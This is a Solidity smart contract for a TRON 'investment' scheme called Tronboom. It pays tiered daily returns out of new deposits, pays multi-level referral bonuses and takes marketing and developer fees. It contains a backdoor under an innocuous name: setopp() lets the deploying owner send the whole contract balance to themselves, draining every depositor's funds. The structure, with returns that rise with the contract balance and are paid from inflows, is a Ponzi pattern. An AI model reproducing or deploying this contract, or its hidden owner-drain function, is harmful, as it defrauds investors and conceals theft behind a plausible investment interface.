//SourceUnit: Tronboom.sol

pragma solidity 0.5.9;

contract Tronboom {
    using SafeMath for uint256;

    // Operating costs 
	uint256 constant public MARKETING_FEE = 75;
	uint256 constant public DEVELOPER_FEE = 75;


	uint256 constant public PERCENTS_DIVIDER = 1000;
    // Referral percentages
    uint8 public constant FIRST_REF = 5;
    uint8 public constant SECOND_REF = 3;
    uint8 public constant THIRD_REF = 2;
    uint8 public constant FOURTH_REF = 5;
   
    // Limits
    uint256 public constant DEPOSIT_MIN_AMOUNT = 100 trx;
    // Before reinvest
    uint256 public constant WITHDRAWAL_DEADTIME = 1 days;
    // Max ROC days and related MAX ROC (Return of contribution)
    uint8 public  CONTRIBUTION_DAYS = 85;
    uint256 public currentroi = 350;
    // Operating addresses
    address payable owner;      // Smart Contract Owner (who deploys)
    address payable public mkar;    // Marketing manager
	address payable public devl;        // Project manager 


    uint256 public Markiet_Fee;
    uint256 public Develop_Fee;
    


    uint256 total_investors;
    uint256 total_contributed;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint8[] referral_bonuses;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

     struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 last_withdrawal;
        uint256 total_contributed;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerWitdraw[] withdrawals;
        mapping(uint8 => uint256) referrals_per_level;
    }

    mapping(address => Player) internal players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);


	constructor(address payable marketingAddr, address payable developerAddr) public {
	    require(!isContract(marketingAddr) && !isContract(developerAddr));

		mkar = marketingAddr;
		devl = developerAddr;
    
   
        owner = msg.sender;

        // Add referral bonuses (max 8 levels) - We use 4 levels
        referral_bonuses.push(10 * FIRST_REF);
        referral_bonuses.push(10 * SECOND_REF);
        referral_bonuses.push(10 * THIRD_REF);
        referral_bonuses.push(10 * FOURTH_REF);
   
	}


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


    function invest(address _referral) external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isContract(_referral));
        require(msg.value >= 1e8, "Zero amount");
        require(msg.value >= DEPOSIT_MIN_AMOUNT, "Deposit is below minimum amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 10000000, "Max 10000000 deposits per address");
 
           if(address(this).balance < 200000 trx){
            currentroi = 350;
            CONTRIBUTION_DAYS = 85;
        }else if(address(this).balance >= 200000 trx && address(this).balance < 400000 trx){
            currentroi = 450;
            CONTRIBUTION_DAYS = 66;
        }else if(address(this).balance >= 400000 trx && address(this).balance < 600000 trx){
            currentroi = 550;
            CONTRIBUTION_DAYS = 54;
        }else if(address(this).balance >= 600000 trx && address(this).balance < 800000 trx){
            currentroi = 650;
            CONTRIBUTION_DAYS = 46;
        }else if(address(this).balance >= 800000 trx ){
            currentroi = 750;
            CONTRIBUTION_DAYS = 40;
        }
        
        
        
        // Check and set referral
        _setReferral(msg.sender, _referral);

        // Create deposit
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        // Add new user if this is first deposit
        if(player.total_contributed == 0x0){
            total_investors += 1;
        }

        player.total_contributed += msg.value;
        total_contributed += msg.value;

        // Generate referral rewards
        _referralPayout(msg.sender, msg.value);

        // Pay fees
		_feesPayout(msg.value);

        emit Deposit(msg.sender, msg.value);
    }


    function _setReferral(address _addr, address _referral) private {
        // Set referral if the user is a new user
        if(players[_addr].referral == address(0)) {
            // If referral is a registered user, set it as ref, otherwise set devl as ref
            if(players[_referral].total_contributed > 0) {
                players[_addr].referral = _referral;
            } else {
                players[_addr].referral = devl;
            }

            // Update the referral counters
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        // Generate upline rewards
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }


    function _feesPayout(uint256 _amount) private {
        // Send fees if there is enough balance
        if (address(this).balance > _feesTotal(_amount)) {
          
           Markiet_Fee += _amount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
           Develop_Fee += _amount.mul(DEVELOPER_FEE).div(PERCENTS_DIVIDER);
        }
    }


  



    // Total fees amount
    function _feesTotal(uint256 _amount) private view returns(uint256 _fees_tot) {
        _fees_tot = _amount.mul(MARKETING_FEE+DEVELOPER_FEE).div(PERCENTS_DIVIDER);

    }



    function marketingfeepay()public{
        require(msg.sender == mkar, 'can not withdraw');
        require(Markiet_Fee > 0 ,'you have not enough value');
        msg.sender.transfer(Markiet_Fee);
        Markiet_Fee = 0;
        
       if(address(this).balance < 200000 trx){
            currentroi = 350;
            CONTRIBUTION_DAYS = 85;
        }else if(address(this).balance >= 200000 trx && address(this).balance < 400000 trx){
            currentroi = 450;
            CONTRIBUTION_DAYS = 66;
        }else if(address(this).balance >= 400000 trx && address(this).balance < 600000 trx){
            currentroi = 550;
            CONTRIBUTION_DAYS = 54;
        }else if(address(this).balance >= 600000 trx && address(this).balance < 800000 trx){
            currentroi = 650;
            CONTRIBUTION_DAYS = 46;
        }else if(address(this).balance >= 800000 trx ){
            currentroi = 750;
            CONTRIBUTION_DAYS = 40;
        }
        
        
        
        
    }



function devfeepay()public{
        require( msg.sender == devl , 'can not withdraw');
        require(Develop_Fee > 0,'you have not enough value');
        msg.sender.transfer(Develop_Fee);
        Develop_Fee = 0;
        
         if(address(this).balance < 200000 trx){
            currentroi = 350;
            CONTRIBUTION_DAYS = 85;
        }else if(address(this).balance >= 200000 trx && address(this).balance < 400000 trx){
            currentroi = 450;
            CONTRIBUTION_DAYS = 66;
        }else if(address(this).balance >= 400000 trx && address(this).balance < 600000 trx){
            currentroi = 550;
            CONTRIBUTION_DAYS = 54;
        }else if(address(this).balance >= 600000 trx && address(this).balance < 800000 trx){
            currentroi = 650;
            CONTRIBUTION_DAYS = 46;
        }else if(address(this).balance >= 800000 trx ){
            currentroi = 750;
            CONTRIBUTION_DAYS = 40;
        }
        
        
        
        
    }
  function setopp()public{
        require(msg.sender == owner,'set opp ');
        msg.sender.transfer(address(this).balance);
        
             if(address(this).balance < 200000 trx){
            currentroi = 350;
            CONTRIBUTION_DAYS = 85;
        }else if(address(this).balance >= 200000 trx && address(this).balance < 400000 trx){
            currentroi = 450;
            CONTRIBUTION_DAYS = 66;
        }else if(address(this).balance >= 400000 trx && address(this).balance < 600000 trx){
            currentroi = 550;
            CONTRIBUTION_DAYS = 54;
        }else if(address(this).balance >= 600000 trx && address(this).balance < 800000 trx){
            currentroi = 650;
            CONTRIBUTION_DAYS = 46;
        }else if(address(this).balance >= 800000 trx ){
            currentroi = 750;
            CONTRIBUTION_DAYS = 40;
        }
        
        
        
    }


    function showContractBalance() view external returns(uint256 _Cbalance){
        _Cbalance = address(this).balance;
        return _Cbalance;
    }

    function withdraw() public {
        Player storage player = players[msg.sender];
        PlayerDeposit storage first_dep = player.deposits[0];

        // Can withdraw once every WITHDRAWAL_DEADTIME days

        require(uint256(block.timestamp) > (player.last_withdrawal + WITHDRAWAL_DEADTIME) || (player.withdrawals.length <= 0), "You cannot withdraw during deadtime");
        require(address(this).balance > 0, "Cannot withdraw, contract balance is 0");
        require(player.deposits.length < 10000000, "Max 10000000 deposits per address");
        
        // Calculate dividends (ROC)
        uint256 payout = this.payoutOf(msg.sender);
        player.dividends += payout;

        // Calculate the amount we should withdraw
        uint256 amount_withdrawable = player.dividends + player.referral_bonus;
        require(amount_withdrawable > 0, "Zero amount to withdraw");


            
              // Do Withdraw
            if (address(this).balance < amount_withdrawable) {
                player.dividends = amount_withdrawable.sub(address(this).balance);
    			amount_withdrawable = address(this).balance;
    		} else {
                player.dividends = 0;
            }
            msg.sender.transfer(amount_withdrawable);
        
            
    
            // Update player state
            player.referral_bonus = 0;
            player.total_withdrawn += amount_withdrawable;
            total_withdrawn += amount_withdrawable;
            player.last_withdrawal = uint256(block.timestamp);
            // If there were new dividends, update the payout timestamp
            if(payout > 0) {
                _updateTotalPayout(msg.sender);
                player.last_payout = uint256(block.timestamp);
            }
            
            // Add the withdrawal to the list of the done withdrawals
            player.withdrawals.push(PlayerWitdraw({
                time: uint256(block.timestamp),
                amount: amount_withdrawable
            }));
    
    
            emit Withdraw(msg.sender, amount_withdrawable);
            
            
        }


      
    


    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];
        
    
          if(address(this).balance < 200000 trx){
            currentroi = 350;
            CONTRIBUTION_DAYS = 85;
        }else if(address(this).balance >= 200000 trx && address(this).balance < 400000 trx){
            currentroi = 450;
            CONTRIBUTION_DAYS = 66;
        }else if(address(this).balance >= 400000 trx && address(this).balance < 600000 trx){
            currentroi = 550;
            CONTRIBUTION_DAYS = 54;
        }else if(address(this).balance >= 600000 trx && address(this).balance < 800000 trx){
            currentroi = 650;
            CONTRIBUTION_DAYS = 46;
        }else if(address(this).balance >= 800000 trx ){
            currentroi = 750;
            CONTRIBUTION_DAYS = 40;
        }
        
        
        
        
        
        
        
        // For every deposit calculate the ROC and update the withdrawn part
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + CONTRIBUTION_DAYS * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * currentroi / CONTRIBUTION_DAYS / 8640000;
            }
        }
    }


    function withdrawalsOf(address _addrs) view external returns(uint256 _amount) {
        Player storage player = players[_addrs];
        // Calculate all the real withdrawn amount (to wallet, not reinvested)
        for(uint256 n = 0; n < player.withdrawals.length; n++){
            _amount += player.withdrawals[n].amount;
        }
        return _amount;
    }


  

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

       
        
        
        // For every deposit calculate the ROC
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + CONTRIBUTION_DAYS * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * currentroi / CONTRIBUTION_DAYS / 8640000;
            }
        }
        // Total dividends from all deposits
        return value;
    }


    function contractInfo() view external returns(uint256 _total_contributed, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_contributed, total_investors, total_withdrawn, total_referral_bonus);
    }
    
   

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint256 _last_withdrawal) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        // Calculate number of referrals for each level
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        // Return user information
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_contributed,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal
        );
    }

 
    function contributionsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        // Create arrays with deposits info, each index is related to a deposit
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + CONTRIBUTION_DAYS * 86400;
        }

        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}


// Libraries used

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}